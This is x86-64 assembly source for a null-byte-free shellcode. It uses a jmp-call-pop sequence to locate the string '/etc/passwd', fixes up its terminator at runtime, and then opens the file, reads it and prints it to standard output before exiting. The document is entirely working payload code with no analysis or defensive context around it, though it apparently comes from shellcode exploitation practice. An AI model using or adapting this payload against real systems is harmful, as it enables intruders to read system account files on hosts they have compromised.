BITS 64

global _start

section .text

_start:
jmp _push_filename
  
_readfile:
; syscall open file
pop rdi ; pop path value
; NULL byte fix
;xor byte [rdi + 11], 0x41
sub byte [rdi + 11], 0x41

;xor rax, rax
;add al, 2
push byte 2
pop rax

xor rsi, rsi ; set O_RDONLY flag
syscall
  
; syscall read file
sub sp, 0xfff
lea rsi, [rsp]
mov rdi, rax

;xor rdx, rdx
;mov dx, 0xfff; size to read
push word 0xffff
pop rdx

xor rax, rax
syscall
  
; syscall write to stdout
xor rdi, rdi
add dil, 1 ; set stdout fd = 1
mov rdx, rax

;xor rax, rax
;add al, 1
push byte 1
pop rax

syscall
  
; syscall exit
;xor rax, rax
;add al, 60
push byte 60
pop rax

syscall
  
_push_filename:
call _readfile
path: db "/etc/passwdA"
